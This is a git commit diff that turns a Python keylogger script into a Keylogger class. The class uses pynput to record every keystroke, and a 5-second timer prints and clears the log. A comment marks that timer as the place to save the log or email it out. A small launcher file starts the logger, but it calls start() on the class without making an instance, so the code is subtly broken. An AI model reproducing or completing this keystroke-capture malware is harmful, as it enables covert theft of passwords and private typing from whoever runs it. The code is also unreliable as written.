15c7d7eeea819ae4605f18cbdd75c2bfe938e4ef
Maffey <matiusz98@gmail.com>
2020-05-06 11:59:39 +0200

    created Keylogger class stub

--- keylogger.py
+++ keylogger.py
@@ -1,23 +1,32 @@
 #! /usr/bin/env python
 
 import pynput.keyboard as pynkey
+import threading
 
 log = ""
 
 
-def process_key_press(key):
-    global log
-    try:
-        log += str(key.char)
-    except AttributeError:
-        if key == key.space:
-            log += " "
-        else:
-            log += " " + str(key) + " "
-    print(log)
+class Keylogger:
+    def process_key_press(self, key):
+        global log
+        try:
+            log += str(key.char)
+        except AttributeError:
+            if key == key.space:
+                log += " "
+            else:
+                log += " " + str(key) + " "
 
+    def report(self):
+        global log
+        print(log)  # Place for reporting the log. Either saving to file or sending by email.
+        log = ""
+        timer = threading.Timer(5, self.report)
+        timer.start()
 
-keyboard_listener = pynkey.Listener(on_press=process_key_press)
-# Can also run it without 'with' block, using .join() method.
-with keyboard_listener:
-    keyboard_listener.join()
+    def start(self):
+        keyboard_listener = pynkey.Listener(on_press=self.process_key_press)
+        # Can also run it without 'with' block, using .join() method.
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
---
+++ zlogger.py
@@ -0,0 +1,6 @@
+#! /usr/bin/env python
+
+import keylogger
+
+keylogger = keylogger.Keylogger
+keylogger.start()
